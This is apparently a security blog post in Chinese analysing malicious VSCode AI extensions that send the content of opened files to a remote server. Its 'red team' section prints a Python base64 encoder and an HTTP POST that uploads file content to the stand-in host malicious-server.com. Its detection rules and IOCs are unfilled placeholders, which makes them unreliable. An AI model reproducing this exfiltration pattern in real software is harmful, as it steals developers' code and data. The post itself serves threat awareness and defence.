---
layout: post
title:  "Malicious AI extensions on VSCode Marketplace steal developer data"
date:   2026-01-24 01:10:08 +0000
categories: [security]
severity: critical
---

# 🚨 解析 VSCode Marketplace 中的惡意擴充套件：MaliciousCorgi 攻擊分析

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak
> * **關鍵技術**: `Base64 Encoding`, `Webview`, `Hidden Iframe`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意擴充套件 (`ChatGPT – 中文版` 和 `ChatMoss`) 未經用戶同意即將開啟的檔案內容傳送至中國的伺服器。這是因為擴充套件使用 `webview` 元素建立一個隱藏的 iframe，從而實現檔案內容的傳送。
* **攻擊流程圖解**: 
    1. 用戶安裝惡意擴充套件。
    2. 用戶開啟檔案。
    3. 擴充套件讀取檔案內容並進行 Base64 編碼。
    4. 編碼後的內容傳送至惡意伺服器。
* **受影響元件**: VSCode Marketplace 上的 `ChatGPT – 中文版` 和 `ChatMoss` 擴充套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 惡意擴充套件安裝權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import base64
    
    def encode_file_content(file_path):
        with open(file_path, 'rb') as file:
            content = file.read()
        encoded_content = base64.b64encode(content).decode('utf-8')
        return encoded_content
    
    ```
 

```

http
POST /upload HTTP/1.1
Host: malicious-server.com
Content-Type: application/json

{
    "file_content": " encoded_file_content "
}

```
* **繞過技術**: 可能使用 WAF 繞過技巧，例如使用不同的 HTTP 方法或編碼方式傳送檔案內容。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `hash_of_malicious_extension` | `malicious_server_ip` | `malicious-server.com` | `path_to_malicious_extension` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
        meta:
            description = "Detects malicious VSCode extension"
            author = "Your Name"
        strings:
            $base64_string = "base64 encoded string"
        condition:
            $base64_string
    }
    
    ```
 

```

snort
alert tcp any any -> any 80 (msg:"Malicious VSCode extension detected"; content:"|base64 encoded string|"; sid:1000001;)

```
* **緩解措施**: 刪除惡意擴充套件，更新 VSCode 至最新版本，並設定 VSCode Marketplace 仅允許安裝來自信任的來源的擴充套件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Base64 Encoding**: 一種將二進制數據轉換為 ASCII 字元的編碼方式。例如，將圖片檔案轉換為 Base64 編碼的字符串，以便在 HTTP 請求中傳送。
* **Webview**: 一種在應用程式中嵌入網頁的技術。例如，使用 `webview` 元素在 VSCode 中嵌入網頁。
* **Hidden Iframe**: 一種隱藏的 iframe 元素，通常用於惡意活動，例如傳送檔案內容至惡意伺服器。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/malicious-ai-extensions-on-vscode-marketplace-steal-developer-data/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


